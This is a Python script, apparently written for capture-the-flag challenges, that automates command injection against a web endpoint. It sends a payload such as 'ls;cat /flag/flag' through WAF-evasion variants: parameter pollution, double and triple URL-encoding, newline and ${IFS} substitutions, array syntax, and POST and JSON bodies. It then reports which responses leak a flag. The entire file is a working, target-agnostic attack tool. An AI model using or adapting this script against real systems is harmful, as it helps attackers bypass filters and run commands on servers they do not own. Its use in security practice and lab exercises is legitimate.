#!/usr/bin/env python3
"""Send a command-injection payload through WAF-evasion variants:
HTTP parameter pollution (first/last), double/triple URL-encoding,
newline/IFS substitutions, query-vs-body. Reports status + flag.

    python waf_variants.py http://inj14.chal.deti:8053/run cmd "ls;cat /flag/flag"
    python waf_variants.py http://t/run cmd "ls;cat /flag/flag" --clean ls
"""
import argparse
import re
from urllib.parse import quote

import requests

FLAG = re.compile(r"flag\{[^}]+\}")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("param")
    ap.add_argument("payload")
    ap.add_argument("--clean", default="ls", help="harmless value the WAF accepts")
    a = ap.parse_args()
    p, v, clean = a.param, a.payload, a.clean
    enc1 = quote(v, safe="")
    enc2 = quote(enc1, safe="")
    enc3 = quote(enc2, safe="")
    variants = {
        "naive (should be blocked)": f"?{p}={enc1}",
        "HPP clean first, payload last": f"?{p}={quote(clean)}&{p}={enc1}",
        "HPP payload first, clean last": f"?{p}={enc1}&{p}={quote(clean)}",
        "HPP + double-encoded last": f"?{p}={quote(clean)}&{p}={enc2}",
        "double encoding": f"?{p}={enc2}",
        "triple encoding": f"?{p}={enc3}",
        "newline instead of ;": f"?{p}={quote(v.replace(';', chr(10)), safe='')}",
        "${IFS} for spaces": f"?{p}={quote(v.replace(' ', '${IFS}'), safe='')}",
        "array syntax p[]": f"?{p}[]={enc1}",
    }
    for name, qs in variants.items():
        try:
            r = requests.get(a.url + qs, timeout=15)
        except requests.RequestException as e:
            print(f"{name:32} ERROR {e}")
            continue
        fl = FLAG.findall(r.text)
        print(f"{name:32} {r.status_code} {len(r.content):6d}  {fl[0] if fl else ''}")
    for name, kw in {"POST body": {"data": {p: v}},
                     "query clean + body payload": {"params": {p: clean}, "data": {p: v}},
                     "JSON body": {"json": {p: v}}}.items():
        try:
            r = requests.post(a.url, timeout=15, **kw)
            fl = FLAG.findall(r.text)
            print(f"{name:32} {r.status_code} {len(r.content):6d}  {fl[0] if fl else ''}")
        except requests.RequestException as e:
            print(f"{name:32} ERROR {e}")


if __name__ == "__main__":
    main()
